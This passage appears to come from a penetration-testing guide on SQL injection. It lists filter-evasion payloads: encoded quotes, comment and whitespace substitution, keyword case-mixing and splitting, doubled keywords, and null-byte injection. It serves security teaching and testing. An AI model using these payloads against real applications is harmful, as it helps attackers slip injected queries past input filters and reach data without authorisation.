# Phase 4: Filter Bypass Techniques

#### Character Encoding Bypass
When special characters are blocked:

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527 (single quote)

-- Unicode alternatives
U+0027 (apostrophe)
U+02B9 (modifier letter prime)

-- Hexadecimal strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
```

#### Whitespace Bypass
Substitute blocked spaces:

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT/**/username/**/FR/**/OM/**/users

-- Alternative whitespace
SELECT%09username%09FROM%09users  -- Tab character
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
```

#### Keyword Bypass
Evade blacklisted SQL keywords:

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION

-- Null byte injection
%00SELECT
SEL%00ECT
```

## Quick Reference